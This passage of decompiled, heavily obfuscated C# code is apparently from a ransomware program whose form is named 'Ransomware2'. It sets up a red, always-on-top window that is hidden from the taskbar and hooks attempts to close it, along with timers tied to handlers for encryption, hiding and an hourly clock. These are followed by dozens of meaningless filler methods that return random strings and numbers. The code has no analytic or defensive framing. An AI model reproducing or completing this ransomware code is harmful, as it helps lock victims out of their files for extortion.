		XDi7CJBxJyfSCYyD969VTOIVHeXFcyZZiEySxZj6QD1jnklm9sCRDI2JeKCr8CfALbxN.set_Interval(10000);
		XDi7CJBxJyfSCYyD969VTOIVHeXFcyZZiEySxZj6QD1jnklm9sCRDI2JeKCr8CfALbxN.add_Tick((EventHandler)tmr_hide_Tick);
		zrcObvlaUKs7xFGUjAQAiFOt5E2DHaRDFAIIMkxqn2TPW9nEAmpgxVJYkfIYWc.set_Enabled(true);
		zrcObvlaUKs7xFGUjAQAiFOt5E2DHaRDFAIIMkxqn2TPW9nEAmpgxVJYkfIYWc.set_Interval(1000);
		zrcObvlaUKs7xFGUjAQAiFOt5E2DHaRDFAIIMkxqn2TPW9nEAmpgxVJYkfIYWc.add_Tick((EventHandler)tmr_show_Tick);
		AVfyXf2KMi8Iz0dvlYRLV16PtHZqZhcvLrx2O7Luv9JZpsFpDKHC.set_Enabled(true);
		AVfyXf2KMi8Iz0dvlYRLV16PtHZqZhcvLrx2O7Luv9JZpsFpDKHC.set_Interval(300);
		AVfyXf2KMi8Iz0dvlYRLV16PtHZqZhcvLrx2O7Luv9JZpsFpDKHC.add_Tick((EventHandler)tmr_if_Tick);
		xPfCrfAwbZvdta5tDz4Z2Mm7UK9oxBlV5VYWsBhERg8Rm1WqjTbgC9MALGf8WbGwdx.set_Enabled(true);
		xPfCrfAwbZvdta5tDz4Z2Mm7UK9oxBlV5VYWsBhERg8Rm1WqjTbgC9MALGf8WbGwdx.set_Interval(1000);
		xPfCrfAwbZvdta5tDz4Z2Mm7UK9oxBlV5VYWsBhERg8Rm1WqjTbgC9MALGf8WbGwdx.add_Tick((EventHandler)tmr_encrypt_Tick);
		eJENBUxXbyuZG7A8lPfwKLwWUmgxzKh9v7LxW3caQ55MlBSMFoq.set_Enabled(true);
		eJENBUxXbyuZG7A8lPfwKLwWUmgxzKh9v7LxW3caQ55MlBSMFoq.set_Interval(3600000);
		eJENBUxXbyuZG7A8lPfwKLwWUmgxzKh9v7LxW3caQ55MlBSMFoq.add_Tick((EventHandler)tmr_clock_Tick);
		((ContainerControl)this).set_AutoScaleDimensions(new SizeF(6f, 13f));
		((ContainerControl)this).set_AutoScaleMode((AutoScaleMode)1);
		((ScrollableControl)this).set_AutoScroll(true);
		((Control)this).set_BackColor(Color.Red);
		((Form)this).set_ClientSize(new Size(1064, 681));
		((Control)this).get_Controls().Add((Control)(object)Zz0wIgI89GBz69rIjXF4DyWfwEJCMJvEj2nZDHGNIrZj7ixUxtkFKfh5458bkqGe);
		((Control)this).get_Controls().Add((Control)(object)VzFqi3YjPm0WJMjBVzfw75iuBjE5hwHT0c3SsWkx57ILnx1ANrxGjCemT4KD59QmJb);
		((Control)this).get_Controls().Add((Control)(object)H1gFILJmGL0ukjRbzdjiCZ00qjU3WedeN5uzcN4pu7bsBR440XZmbP3G19CjBdSFnpR);
		((Control)this).get_Controls().Add((Control)(object)ngNe4hXX0UGwj9DjKbJsLL6Af4DtTopXc1ZVZeNVCmDsv9YTUV);
		((Control)this).get_Controls().Add((Control)(object)cxw7Wsd3XTKAAlOux8FVm7yf8BZNkhlgdqDvDOMzBhbICPdcUXXJb);
		((Control)this).get_Controls().Add((Control)(object)lbl1);
		((Control)this).get_Controls().Add((Control)(object)jPmOAPWtJS1z78z7tayIbawaW6fsNWjeCKXAIRzH7WO0bm1iogb);
		((Control)this).get_Controls().Add((Control)(object)EFuhb4uhY40PG1bL0Cdj6bI8sotrGHSeQ945C1EhM0odhtonD7ZOT3Llqu04O4gPy);
		((Control)this).set_Cursor(Cursors.get_No());
		((Form)this).set_FormBorderStyle((FormBorderStyle)1);
		((Form)this).set_Icon((Icon)componentResourceManager.GetObject("$this.Icon"));
		((Form)this).set_MaximizeBox(false);
		((Form)this).set_MinimizeBox(false);
		((Control)this).set_Name("Ransomware2");
		((Form)this).set_ShowInTaskbar(false);
		((Form)this).set_StartPosition((FormStartPosition)1);
		((Control)this).set_Text("HWDP");
		((Form)this).set_TopMost(true);
		((Form)this).add_FormClosing(new FormClosingEventHandler(Ransomware2_FormClosing));
		((Form)this).add_Load((EventHandler)Ransomware2_Load);
		((ISupportInitialize)EFuhb4uhY40PG1bL0Cdj6bI8sotrGHSeQ945C1EhM0odhtonD7ZOT3Llqu04O4gPy).EndInit();
		((ISupportInitialize)jPmOAPWtJS1z78z7tayIbawaW6fsNWjeCKXAIRzH7WO0bm1iogb).EndInit();
		((Control)this).ResumeLayout(false);
		((Control)this).PerformLayout();
	}

	public static string Cuo5n1GFdWRKs33hNDtg25qxmR1U8NPy9iXcwBGRblxAGKiAGO()
	{
		return "h2CQLAatMT2bw0YSvYbjOjI4a47J9Q4JrMdWvi56TlZoL0YFpM8UgbiR4HE";
	}

	public static int u5nAyHUyUzF9ilGzMMJsQhHDn65J0HwmVZtWEmQCVlB6LqkwkV()
	{
		return 66855946;
	}

	public static string W6CoZzVFF5ByehMgwIYIxbWqIaaxmOOFdm59wurWj1IhVJIT9q()
	{
		return "IhX5Bnh5i2w2EaXtcqHvkOYNwsHOkOxmH3Zk6gZE11cFHL6KDVV9Q2buHNLQS361c";
	}

	public static int yzcuIaRUDHcIAsJgjVw7GUc06Xp5FHxxcAVJJtgC3Rksoqp18K()
	{
		return 114164502;
	}

	public static string rQrM0DXSg0TfYn5aUGOtRzLWwL5GDyp6FKvbWxc7ap91Y5rVH9()
	{
		return "PVLe8hu035GYhTUPzOv90LGjKe5mG2Z5IuvJ4fVhwNNTxCLXcR";
	}

	public static int L5FTAxoeSv9PYe4G4N4t4KCXPy2wwXtPXZ3pXww6r7xFmRSwT6()
	{
		return 452708428;
	}

	public static string jWFgtxxTPSFcRsXn1skXGqdRI1VMGpod06x5NUeDuJdtkJrInB()
	{
		return "wJQrWrdLDKfn01FHA4S2zcn0qgK4NYVVoy3yh2nyPPTAMQDmRke";
	}

	public static int RSwsffj8uFdxn1RZam2fXwRifWcWmAOBb4Cu8WVglSwdA3B73O()
	{
		return 432934099;
	}

	public static string mizGWmf3RMnQTesM3MMCCUniSSZ4rDDmpZJl1zlvZ4x47g40tC()
	{
		return "XlTcSjQNiBtZgjkuFeeQ2n9oXQuJjDSExd7rMw98AhFi4YezFcpMoqCh0L";
	}

	public static int ZTPujCwsC2sYUhABBDHm3oAlWYT57191Ac0bi0DEPWU5AWMSyG()
	{
		return 186742110;
	}

	public static string K2v6q6lwsKbYzbwfMum2u0mDYhsYGjNBYdB3b0NMfEkLAhA7zf()
	{
		return "tWnVBSDsT7Tc4bqsh7CG3zLCicvaO9tBIbR9264lHTtOeTpl2iTcsMQ4hSCEpZGnz";
	}

	public static int wkzCc9aOvuON3lFQ33EjxL6ypchbe5CtXZHxvXc5Gp8vNrkEDd()
	{
		return 630057776;
	}

	public static string B7omz1TCtAWV6AcjA3j4OmIDhfjNcUUQCAYxDEOaWKqwaOKCYQ()
	{
		return "awo7JaKTDnnQiNDHPcej0PwLAsheiRuP050O22yrhMzNGgoFMaLdPWvMMamc";
	}

	public static int Wh0qslFiTlUp89iXdGlQ1JfY57XfP3DlmWP3U4f4moznhVt3IQ()
	{
		return 387493385;
	}

	public static string pHZY94Q4FYDaslIfceF9SiUbtP2fNqYtdnuJgGPEcLePEysfHf()
	{
		return "PksAe1uFmnHSoUIwsbUKcvfpSIle7c2pxaHgj8X2gcsEU0pqWd0224xRgVzu77";
	}

	public static int w4oMerTW54A9nWB400zsIbHxvqIZ2nlkocT4GWsJzwbAtt1Y3j()
	{
		return 209849544;
	}

	public static string rJQ59fPWzqYEXRaV12mQMj8765o0Dr7RqGrCvS5IasMa632Iqe()
	{
		return "GTodtP4g6zPLgcZpQBIlBTJPb5gWcIyiXznjsf9cqI1bvbrBjoa4oB4RPUo94K5R7Pw";
	}

	public static int S0TQ88piARITuORsXkQnQNCqgHE25jFTu9FYXrbHblddhHwV8U()
	{
		return 1193594;
	}

	public static string JhAlmHkAGotAjp4tfYpvacXTYdpAOBZKZGB8geKc9PZDh8qEFn()
	{
		return "53Di4KJV4DWTApIYQLCKZppIjmC9KYNIE8C9bxx46UBznguGVYPUvSfCaou";
	}

	public static int xJci5BC6AD4Yr9br4h72E5W72i5qNxz2hkkbgYVab9fpx7KeGs()
	{
		return 541340153;
	}

	public static string r7SWVdXh17LEmjyWspWiRUJu8dIGJatxL1suVZvgD6AadIrV9z()
	{
		return "irJercUHRo59CtbKO8UqQ3Ip1goYktRowhrjrtLFjzs6gECimpr95";
	}

	public static int hhk35DJ1SBLAIrcRVJm816rcGwjqY32UJIfBGRGD3IFAJdde4p()
	{
		return 550997906;
	}

	public static string X7ogvFwNxx1aui9b1BosDTo7UlEp3zyYiBFaUwKbw76rx7Wqko()
	{
		return "1RWc1gGxs2zWFF7afyATCP6OE5ZHwpJJYnwy9RFzTMdIRnFYKNbfF6tZHpw6PeKuGf";
	}

	public static int dzC42sbbdj0NIZReTfZYO1s8sVKBNWLeLxWmZ70wMXTsq9BDtB()
	{
		return 515268138;
	}

	public static string smlCAW5qvILOJqCIeH9mdw2IMpeX7LRKW4Dxxjdcdh85AsHnwD()
	{
		return "vHQICg0Ay5AWVRLtP1hgqkn5thsowuruXFG1HZIhqqzjwjVf2qkvsKaXC6knzlI";
	}

	public static int DmxkamAAXZMT3tvJqvuJAKQdWEqSuJEfODo2UbGfDzOwN9b1rb()
	{
		return 786463564;
	}

	public static string LaC3oMQ2ZpY3TzTRQ9g1E5SCGCCfW0cVogMgf4ttBDQ9ML45ea()
	{
		return "SC6TtF34hDrwCKu9UIf9RJ20nrETlxnn6Id3Wpq9jQSZDlsyuaxG";
	}

	public static int se5sOLBiQE7bNg0NtsVH4ojPVL1MHSaqmPxIvVwKXWodfzsR5h()
	{
		return 583840857;
	}

	public static string Oq4s5HnF49plbNawECyF1t7YAqi84oyE2n3e2HDbZFrAQETn9r()
	{
		return "3Du2ijQ8gV8CfK0M1TO7ibeyslOwgJkQbTZYInkpEsW7oSo8JWWM5Og3dFoDiDkDY";
	}

	public static int NKTF4SZ2REyovhjdWp6Ky5OdwtDXR1RY4Bx3gpAq7bWvQWJ1mT()
	{
		return 743715472;
	}

	public static string PruGSX2Ex006KGqfZ4Q3g0ZcoN0UdyTxevSV0anhNDKSOqLtca()
	{
		return "8BKdpEMU22h6kCn5WBD3jZKcUcmOTi6wCTbS2Iq80Wz9wMxr4g";
	}

	public static int f1Xjm6YEtlXYsIOpHar7tFAYrQoVdFdMjPS2CI1WpaPSsjDopV()
	{
		return 761323682;
	}

	public static string UmBmzcScnU43QIJj1En2mCpeT7GZRFGYs15egCc7BDZ0jzSLMH()
	{
		return "em9sb4FLeePc3NkdKZgyi75pXNC2AiUQRJCl0ArsRwcrLc2GHTWDwlvcQDiqOf4GI7";
	}

	public static int Aazhlxx3ZZPrxedD8ncwEQeAMxehzoLS3o930JnTSEo8la2F0T()
	{
		return 385316749;
	}

	public static string zllHEx3fhoHi9N6DVEHgokqbczTg7Ow05L523hPfYwfBWhPdrx()
	{
		return "8sYZfXaP89JVnDrSI0HwuYCvjFGTwDSOwtHIaAtyHNOKoT71H3xTM7";
	}

	public static int UCEgEejwf29eoibgwxdBTmRisRDb2M4oemMkCrGvaoPiJbK6zj()
	{
		return 476814736;
	}
}
